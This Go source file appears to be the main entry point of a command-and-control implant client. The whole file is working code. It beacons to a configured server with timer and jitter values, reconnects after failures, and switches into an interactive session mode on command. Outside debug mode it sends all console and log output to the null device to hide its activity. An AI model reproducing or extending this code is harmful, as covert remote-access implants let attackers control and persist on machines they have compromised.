package main

import (
	"fmt"
	stlog "log"
	"os"
	"strconv"
	"time"

	beaconHandler "src/Client/beacon/beaconHandler"
	httpFuncs "src/Client/beacon/http"
	"src/Client/generic/config"
	"src/Client/generic/logger"
	"src/Client/generic/rpc_client"
	"src/Client/session"

	"github.com/hashicorp/go-plugin"
)

// --- Output Suppression Utility ---
var originalStdout *os.File
var originalStderr *os.File

// suppressOutput redirects stdout and stderr to /dev/null (or NUL on Windows).
func suppressOutput() {
	originalStdout = os.Stdout
	originalStderr = os.Stderr
	devNull, err := os.OpenFile(os.DevNull, os.O_WRONLY, 0755)
	if err != nil {
		// Use standard log here as our custom logger might be suppressed
		stlog.Fatalf("Failed to open %s: %v", os.DevNull, err)
	}
	os.Stdout = devNull
	os.Stderr = devNull

	// Also redirect the standard Go logger if it's used inadvertently elsewhere
	stlog.SetOutput(devNull)
}

func beacon() {
	for count := 0; count < config.MaxRetries; count++ {
		logger.Log("Starting new iteration")
		if config.ID != "" && config.Jitter != -1 && config.Timer != -1 {
			logger.Log("HTTP Reconnect")
			responseCode, _, Err := httpFuncs.HTTPReconnect(config.URL, config.ID, config.Jitter, config.Timer)

			if Err != nil {
				logger.Error(fmt.Sprintf("Critical error during HTTP reconnect: %v", Err))
				os.Exit(1)
			}
			if responseCode == -1 {
				logger.Log("HTTP Reconnect indicated recoverable failure, retrying...")
				time.Sleep(5 * time.Second)
				continue
			}
		} else {
			logger.Log("HTTP Connect")

			connTimer, connID, connJitter, err := httpFuncs.HTTPConnection(config.URL)

			if err != nil {
				logger.Error(fmt.Sprintf("Critical error establishing HTTP connection: %v", err))
				os.Exit(1)
			}
			if connTimer == -1 {
				logger.Log("HTTP Connection indicated recoverable failure, retrying...")
				time.Sleep(5 * time.Second)
				continue
			}

			config.Timer = connTimer
			logger.Log("Timer set to " + strconv.FormatFloat(config.Timer, 'f', -1, 64))
			config.ID = connID
			logger.Log("ID set to " + config.ID)
			config.Jitter = connJitter
			logger.Log("Jitter set to " + strconv.FormatFloat(config.Jitter, 'f', -1, 64))
		}

		logger.Log("Beaconing")
		var beaconStatus int
		err, switchSession := beaconHandler.Beacon()
		if err != nil {
			logger.Error(fmt.Sprintf("Critical error during beacon: %v", err))
			os.Exit(1)
		}
		if switchSession {
			logger.Log("Switching to session mode")
			session.SessionHandler()
			continue
		}

		if beaconStatus == -1 {
			logger.Log("Beaconing failed (recoverable), retrying...")
			time.Sleep(5 * time.Second)
			continue
		}

	}
}

func main() {
	if config.IsDebug() {
		logger.Warn("Debug mode enabled")
	}

	logger.Warn("Program Starting")

	if !config.IsDebug() {
		suppressOutput()
	}

	// Print list of loaded dynamic commands
	cmds := rpc_client.ListDynamicCommands()
	logger.Log(fmt.Sprintf("Loaded dynamic commands: %v", cmds))

	switch config.PrimaryConnectionMethod {
	case "session":
		logger.Log("Session mode is the primary connection type.")
		session.SessionHandler()
	case "beacon":
		logger.Log("Beacon mode is the primary connection type.")
		beacon()
	default:
		logger.Warn("Unknown primary connection type, defaulting to beacon mode.")
		beacon()

	}
	plugin.CleanupClients()
}
